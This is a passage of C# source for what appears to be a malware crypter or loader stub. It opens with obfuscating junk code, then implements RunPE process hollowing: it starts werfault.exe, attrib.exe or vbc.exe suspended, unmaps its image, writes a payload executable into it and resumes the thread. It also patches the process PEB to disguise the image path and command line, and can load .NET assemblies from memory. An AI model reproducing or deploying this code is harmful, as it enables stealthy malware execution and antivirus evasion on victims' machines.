                MessageBox.Show(CJnZcZJbluYjKoBttLAbGMmolPmS.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            int STnUVM = 88;
            while (STnUVM == 88)
            {
                STnUVM += 887018;
            }
            int OpSnmCtPxC = 881572618;
            if (OpSnmCtPxC == 201066)
            {
                OpSnmCtPxC += 189462;
            }
            long HMiAGTmSDCxpq = 17214643863359027;
            string dxMWbjOKeAVmRfoLZbwYRsg = "LzUHPgFQ";
            int fcTWkJPRqRxZEDtLdeibWLpCkDohV = 905356834;
            while (fcTWkJPRqRxZEDtLdeibWLpCkDohV == 905356834)
            {
                fcTWkJPRqRxZEDtLdeibWLpCkDohV = 995408;
            }
            byte cQMjaaoOMUqmedAHEbwMqLIuH = 237;
            ushort qsLDgTbnxSWKaNAIXUQUwzdRFAA = 21615;
            sbyte DdItytjPflck = -80;
            ulong LLFla = 85598556767086242;
            double tKgeoTcHpgziOFSknqLU = 4.515712E+31;
            if (tKgeoTcHpgziOFSknqLU == -2.233766E+32)
            {
                tKgeoTcHpgziOFSknqLU = Math.Floor(2.548131E+34);
                int[] AVUOMcjso = { 9374363, 94901 };
                Random AfiUzlKHaHJRxCEaffMGwOg = new Random();
                Console.WriteLine(AVUOMcjso[AfiUzlKHaHJRxCEaffMGwOg.Next(0, 2)]);
            }
            short pDcsVJPgjwdKSiQEqAIAsjL = 28159;
            string KqLZmXhAteXoOiHuuFc = "UyFjPxoSugRgno";
            double wjigDsPMHcMATXP = -2.427876E+29;
            while (wjigDsPMHcMATXP == 1.53865E-21)
            {
                double IoemmRaAiiZkxWTCJSENLQYxs = 63.28955;
                wjigDsPMHcMATXP = Math.Round(IoemmRaAiiZkxWTCJSENLQYxs);
                for (; ; )
                {
                    Console.WriteLine(1.202619E-20);
                }
            }
            ulong oStk = 80856831603730567;
            double IpVmUuGBi = 4.978536E-05;
            while (IpVmUuGBi == -8.523296E+16)
            {
                IpVmUuGBi = Math.Pow(double.MinValue, double.MaxValue);
                int? wCdhEcEuxOKyNpMR = 4932424;
                wCdhEcEuxOKyNpMR += 77167;
            }
            double NcCSfyqxQiBNoWWGYuTx = 2.301208E+10;
            while (NcCSfyqxQiBNoWWGYuTx == -1.869829E-25)
            {
                double jhBVNP = -2.54076E+21;
                NcCSfyqxQiBNoWWGYuTx = Math.Round(jhBVNP);
                MessageBox.Show(NcCSfyqxQiBNoWWGYuTx.ToString());
            }
        }
    }







    class Ran
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Ran.STARTUP_INFORMATION startupInfo, ref Ran.PROCESS_INFORMATION processInformation);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr handle);



        public static bool RunFromMemory(byte[] bytes)
        {
            try
            {
                Assembly assembly = Assembly.Load(bytes);
                MethodInfo entryPoint = assembly.EntryPoint;
                object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
                entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[] { new string[] { "1" } });
            }
            catch (Exception e)
            {
                return false;
            }
            return true;
        }
        public static bool RunFromMemoryBackup(byte[] bytes)
        {
            try
            {
                Assembly.Load(bytes).EntryPoint.Invoke(null, null);
            }
            catch (Exception e)
            {
                return false;
            }
            return true;
        }
        public static bool IsFileDotNetAssembly(byte[] file)
        {
            int hResult = 0;
            const int COR_E_ASSEMBLYEXPECTED = -2147024885;
            const int COR_E_NEWER_RUNTIME = -2146234341;
            const int COR_E_FILELOAD = -2146232799;
            Assembly assemblyBuffer = default(Assembly);
            try
            {
                assemblyBuffer = Assembly.ReflectionOnlyLoad(file);
                return true;
            }
            catch (BadImageFormatException ex)
            {
                hResult = Marshal.GetHRForException(ex);
                if (!(hResult == COR_E_ASSEMBLYEXPECTED))
                {
                    if ((hResult == COR_E_NEWER_RUNTIME))
                    {
                        return true;
                    }
                }
            }
            catch (System.IO.FileLoadException ex)
            {
                hResult = Marshal.GetHRForException(ex);
                if ((hResult == COR_E_FILELOAD))
                {
                    return true;
                }
            }
            return false;
        }

        public static bool RRPP(byte[] exeFile, string inject)
        {
            bool ret = false;
           // if ((IsFileDotNetAssembly(exeFile)))
         //   {
          //      if (!(RunFromMemory(exeFile)))
           //     {
            //        if (!(RunFromMemoryBackup(exeFile)))
            //        {
            //            ret = false;
            //        }
           //    }
           // }
          //  else
          //  {

                string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string winLogonPath = Path.Combine(sysPath, "werfault.exe");
                string itself = Application.ExecutablePath;
                string attrib = "C:\\Windows\\System32\\attrib.exe";
                string vbcPath = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v2.0.50727\vbc.exe";
                //ret = Run(vbcPath, null, exeFile, false);
                switch (inject)
                {
                    case "attrib":
                        ret = Run(attrib, null, exeFile, false);
                        break;
                    case "vbc":
                        ret = Run(vbcPath, null, exeFile, false);
                        break;
                    case "itself":
                        ret = Run(itself, null, exeFile, false);
                        break;
                    case "werfault":
                        ret = Run(winLogonPath, null, exeFile, false);
                        break;
                }

         //   }
            return ret;
        }

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            bool result;
            for (int i = 1; i <= 5; i++)
            {
                if (Ran.HandleRun(path, cmd, data, compatible))
                {
                    result = true;
                    return result;
                }
            }
            result = false;
            return result;
        }


        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int num = 0;
            string text = string.Format("\"{0}\"", path);
            Ran.STARTUP_INFORMATION targetProcessStartInfo = default(Ran.STARTUP_INFORMATION);
            Ran.PROCESS_INFORMATION targetProcessInfo = default(Ran.PROCESS_INFORMATION);
            targetProcessStartInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(Ran.STARTUP_INFORMATION)));
            bool result;
            try
            {
                if (!string.IsNullOrEmpty(cmd))
                {
                    text = text + " " + cmd;
                }
                if (!Ran.CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref targetProcessStartInfo, ref targetProcessInfo))
                {
                    throw new Exception();
                }
                int num2 = BitConverter.ToInt32(data, 60);
                int num3 = BitConverter.ToInt32(data, num2 + 52);
                int[] array = new int[179];
                array[0] = 65538;
                if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!Ran.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!Ran.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                int num4 = array[41];
                int num5 = 0;
                if (!Ran.ReadProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, ref num5, 4, ref num))
                {
                    throw new Exception();
                }
                if (num3 == num5)
                {
                    if (Ran.NtUnmapViewOfSection(targetProcessInfo.ProcessHandle, num5) != 0)
                    {
                        throw new Exception();
                    }
                }

             //   Ran.Sleep(1000);

                int length = BitConverter.ToInt32(data, num2 + 80);
                int bufferSize = BitConverter.ToInt32(data, num2 + 84);
                bool flag = false;
                int num6 = Ran.VirtualAllocEx(targetProcessInfo.ProcessHandle, num3, length, 12288, 64);
                if (!compatible && num6 == 0)
                {
                    flag = true;
                    num6 = Ran.VirtualAllocEx(targetProcessInfo.ProcessHandle, 0, length, 12288, 64);
                }
                if (num6 == 0)
                {
                    throw new Exception();
                }

                //  Ran.Sleep(5000);

                if (!Ran.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6, data, bufferSize, ref num))
                {
                    throw new Exception();
                }

                int num7 = num2 + 248;
                short num8 = BitConverter.ToInt16(data, num2 + 6);
                for (int i = 0; i <= (int)(num8 - 1); i++)
                {
                    int num9 = BitConverter.ToInt32(data, num7 + 12);
                    int num10 = BitConverter.ToInt32(data, num7 + 16);
                    int srcOffset = BitConverter.ToInt32(data, num7 + 20);
                    if (num10 != 0)
                    {
                        byte[] array2 = new byte[num10];
                        Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
                        if (!Ran.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6 + num9, array2, array2.Length, ref num))
                        {
                            throw new Exception();
                        }
                    }
                    num7 += 40;
                }

                // Ran.Sleep(10000);
                Ran.Sleep(1000);
                byte[] bytes = BitConverter.GetBytes(num6);
                if (!Ran.WriteProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, bytes, 4, ref num))
                {
                    throw new Exception();
                }
                int num11 = BitConverter.ToInt32(data, num2 + 40);
                if (flag)
                {
                    num6 = num3;
                }

                array[44] = num6 + num11;
                if (IntPtr.Size == 4)
                {
                    if (!Ran.SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    if (!Ran.Wow64SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

                // Ran.Sleep(1000);

                Ran.ReadProcessMemory(targetProcessInfo.ProcessHandle, 0x0, ref num5, 4, ref num);

                if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!Ran.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!Ran.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

              //  Ran.Sleep(5000);

                // Patch the PEB
                bep.Apply(targetProcessInfo.ThreadHandle, Assembly.GetEntryAssembly().Location);

                //   Ran.Sleep(5000);

                if (Ran.ResumeThread(targetProcessInfo.ThreadHandle) == -1)
                {
                    throw new Exception();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Process processById = Process.GetProcessById(Convert.ToInt32(targetProcessInfo.ProcessId));
                if (processById != null)
                {
                    processById.Kill();
                }
                result = false;
                return result;
            }
            result = true;
            return result;
        }
    }

    unsafe class bep
    {
        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, out PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2a;
            public IntPtr Reserved2b;
            public uint UniqueProcessId;
            public IntPtr Reserved3;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PEB
        {
            public fixed byte Reserved1[2];
            public byte BeingDebugged;
            public fixed byte Reserved2[1];
            public IntPtr Mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr LoaderData;
            public IntPtr ProcessParameters;
            public fixed byte Reserved4[104];
            public fixed uint Reserved5[52];
            public IntPtr PostProcessInitRoutine;
            public fixed byte Reserved6[128];
            public fixed uint Reserved7[1];
            public uint SessionId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RTL_USER_PROCESS_PARAMETERS
        {
            public uint MaximumLength;
            public uint Length;
            public uint Flags;
            public uint DebugFlags;
            public IntPtr ConsoleHandle;
            public uint ConsoleFlags;
            public IntPtr StdInputHandle;
            public IntPtr StdOutputHandle;
            public IntPtr StdErrorHandle;
            public UNICODE_STRING CurrentDirectoryPath;
            public IntPtr CurrentDirectoryHandle;
            public UNICODE_STRING DllPath;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
            public IntPtr Environment;
            public uint StartingPositionLeft;
            public uint StartingPositionTop;
            public uint Width;
            public uint Height;
            public uint CharWidth;
            public uint CharHeight;
            public uint ConsoleTextAttributes;
            public uint WindowFlags;
            public uint ShowWindowFlags;
            public UNICODE_STRING WindowTitle;
            public UNICODE_STRING DesktopName;
            public UNICODE_STRING ShellInfo;
            public UNICODE_STRING RuntimeData;
            public fixed byte DLCurrentDirectory[0x20 * 0xc];
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        static void WriStr(IntPtr hp, ref UNICODE_STRING ucod, string newq)
        {
            if (!string.IsNullOrEmpty(newq) &&
                    newq.Length > 0)
            {
                uint der;

                byte[] sbuf = Encoding.Unicode.GetBytes(newq);
                IntPtr ptr = Marshal.AllocHGlobal(sbuf.Length);
                Marshal.Copy(sbuf, 0, ptr, sbuf.Length);

                VirtualProtectEx(hp, ucod.Buffer, (uint)sbuf.Length, /* PAGE_EXECUTE_READWRITE */ 0x40, out der);
                WriteProcessMemory(hp, ucod.Buffer, ptr, (uint)sbuf.Length, out der);
                ucod.Length = (ushort)(newq.Length * 2);
            }
        }
        public static bool Apply(IntPtr hProcess, string path = null, string cmdLine = null, string CurrentDirectoryPath = null)
        {
            if (hProcess == null ||
                hProcess == IntPtr.Zero)
            {
                return false;
            }

            try
            {
                // default Varametrs
                uint len;

                // get PROCESS_BASIC_INFORMATION
                var info = new PROCESS_BASIC_INFORMATION();
                NtQueryInformationProcess(hProcess, 0, out info, (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out len);

                // get PROCESS_BASIC_INFORMATION
                var peb = new PEB();
                ReadProcessMemory(hProcess, info.PebBaseAddress, (IntPtr)(&peb), (uint)Marshal.SizeOf(typeof(PEB)), out len);

                // get RTL_USER_PROCESS_PARAMETERS
                var psParam = new RTL_USER_PROCESS_PARAMETERS();
                ReadProcessMemory(hProcess, peb.ProcessParameters, (IntPtr)(&psParam), (uint)Marshal.SizeOf(typeof(RTL_USER_PROCESS_PARAMETERS)), out len);

                // patch
                WriStr(hProcess, ref psParam.ImagePathName, path);
                WriStr(hProcess, ref psParam.CommandLine, cmdLine);
                WriStr(hProcess, ref psParam.CurrentDirectoryPath, CurrentDirectoryPath);

                // reflecet Changes
                return
                    WriteProcessMemory(hProcess, peb.ProcessParameters, (IntPtr)(&psParam), (uint)Marshal.SizeOf(typeof(RTL_USER_PROCESS_PARAMETERS)), out len);
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}